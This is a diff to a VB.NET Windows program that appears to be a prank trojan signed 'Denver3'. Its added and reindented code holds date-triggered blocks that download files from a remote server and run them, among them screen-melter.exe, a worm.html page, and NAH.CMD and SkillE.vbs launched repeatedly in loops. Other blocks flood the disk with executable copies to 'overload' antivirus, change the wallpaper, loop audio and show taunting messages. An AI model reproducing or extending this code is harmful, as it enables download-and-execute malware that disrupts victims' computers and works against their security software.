@@ -22,10 +22,17 @@ Public Class Form1
     Private ReadOnly filePath As String = "first_open.txt"
 
     Private Sub DebugScript() 'Code to run on debug mode
-        For i As Integer = 1 To 60
-            Dim q As New still_using_this_computer()
-            q.Show()
-        Next
+        Try
+            My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
+        Catch ex As Exception
+
+        End Try
+        Try
+            My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
+        Catch ex As Exception
+
+        End Try
+        HELL_NAH.Show()
     End Sub
 
 
@@ -270,101 +277,142 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 End Try
 
             End If
+            If currentTime.Month = 10 And currentTime.Date.Day = 19 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav")
+                Catch ex As Exception
 
+                End Try
+                Try
+                    My.Computer.Audio.Play(InstallPath & "\PC_Virus.Win32.ResonateII_The_Final_Countdown_Corrscope.wav", AudioPlayMode.BackgroundLoop)
+                Catch ex As Exception
 
+                End Try
+                IntroThing.Show()
+            End If
+
+            If currentTime.Month = 4 And currentTime.Date.Day = 20 Then
+                SetWallpaper(pic_cannabis_leaf.Image)
+            End If
+            If currentTime.Month = 7 And currentTime.Day = 6 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "Sonic.exe_Green_Hill_Zone_Reversed.wav", InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    My.Computer.Audio.Play(InstallPath & "\Sonic.exe_Green_Hill_Zone_Reversed.wav", AudioPlayMode.BackgroundLoop)
+                Catch ex As Exception
+
+                End Try
+                HELL_NAH.Show()
+            End If
+            If currentTime.Month = 2 And currentTime.Day = 8 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "screen-melter.exe", InstallPath & "\screen-melter.exe")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start(InstallPath & "\screen-melter.exe")
+                Catch ex As Exception
+                    MsgBox("FAILED TO START: screen-melter.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
             If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
-                FreeRobuxGen.Show()
-            End If
-            If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
-                Catch ex As Exception
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
-            End If
-            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
-                My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-                Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-            End If
-            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
-                Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
-            End If
-            If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
-                MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
-                'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
-
-
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
-                Catch ex As Exception
-
-                End Try
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")
-
-                Catch ex As Exception
-
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
-                MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
-                For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\NAH.CMD")
-                    Process.Start(InstallPath & "\SkillE.vbs")
-                Next
-            End If
-
-
-            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
-
-                Catch ex As Exception
-
-                End Try
-                MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
-                For index As Integer = 1 To 20
-                    Process.Start(InstallPath & "\SkillE.vbs")
-                Next
-            End If
-
-            If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
-                MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
-                Catch ex As Exception
-                End Try
-                For index As Integer = 1 To 30 'OverLoadAntiVirus
+                    FreeRobuxGen.Show()
+                End If
+                If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                     Try
-                        My.Computer.FileSystem.CopyFile(InstallPath & "\AVTESTFILE.EXE", InstallPath & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
+                        My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
                     Catch ex As Exception
                     End Try
-                Next
-            End If
+                    My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
+                End If
+                If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+                    My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+                    Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+                End If
+                If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
+                    Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
+                End If
+                If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
+                    MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
+                    'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
 
-            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
-                ScreenStuck.Show()
-            End If
-            If currentTime.Month = 11 Then
-                Try
-                    My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
-                Catch ex As Exception
-                End Try
-                My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
-                MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
-            End If
 
-            If currentTime.Month = 12 And currentTime.Day = 1 Or True = False Then
-                fuckpc()
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")
+
+                    Catch ex As Exception
+
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
+                    MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
+                    For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\SkillE.vbs")
+                    Next
+                End If
+
+
+                If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
+
+                    Catch ex As Exception
+
+                    End Try
+                    MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
+                    For index As Integer = 1 To 20
+                        Process.Start(InstallPath & "\SkillE.vbs")
+                    Next
+                End If
+
+                If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
+                    MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
+                    Catch ex As Exception
+                    End Try
+                    For index As Integer = 1 To 30 'OverLoadAntiVirus
+                        Try
+                            My.Computer.FileSystem.CopyFile(InstallPath & "\AVTESTFILE.EXE", InstallPath & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
+                        Catch ex As Exception
+                        End Try
+                    Next
+                End If
+
+                If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
+                    ScreenStuck.Show()
+                End If
+                If currentTime.Month = 11 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
+                    Catch ex As Exception
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
+                    MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
+                End If
+
+                If currentTime.Month = 12 And currentTime.Day = 1 Or True = False Then
+                    fuckpc()
+                End If
             End If
-        End If
     End Sub
 
     Public Sub ChangeMD5AndExit()
